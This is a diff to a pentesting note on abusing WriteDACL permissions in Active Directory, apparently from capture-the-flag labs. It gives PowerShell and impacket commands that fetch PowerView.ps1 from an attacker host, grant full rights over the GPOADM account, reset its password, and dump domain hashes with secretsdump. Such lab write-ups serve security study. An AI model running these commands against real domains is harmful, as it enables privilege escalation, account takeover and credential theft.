@@ -1,7 +1,8 @@
 
 An severe misconfiguration which grants us the power to grant ourselves any permission on the domain.
 
-## PoC
+---
+## Group WriteDACL
 
 1. Creating user and putting him into the Group we want to elevate our privileges.
 
@@ -36,3 +37,39 @@ Since our created user "hacker" got DSync permissions now, we can dump all the h
 ```
 impacket-secretsdump htb.local/hacker:password@10.129.59.98
 ```
+
+---
+## User WriteDACL
+
+##### Remotely
+
+-
+
+##### Internally
+
+Inspected our current user's amelia.griffiths outbound object control was promising. She is inside the "legacy" group, which has WriteDACL on the gpoadm. 
+
+Since we don't have the password of amelia.griffiths, we have to abuse the WriteDACL internally, which we can do with PowerView.ps1.
+
+1. Let's first transfer PowerView.ps1 onto the target and inject it into memory.
+
+```
+iwr -uri http://10.10.14.57/PowerView.ps1 -OutFile PowerView.ps1
+. .\PowerView.ps1
+```
+
+2. Now I’ll give Amelia.Griffiths permissions over the GPOADM account, and then set the password:
+
+```
+Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths
+$cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword GPOADM -AccountPassword $cred
+```
+
+3. Verifying if password change worked:
+
+```
+nxc smb dc.baby2.vl -u GPOADM -p 'Password123!'
+```
+
+It worked! We successfully changed the password of the GPOADM user.
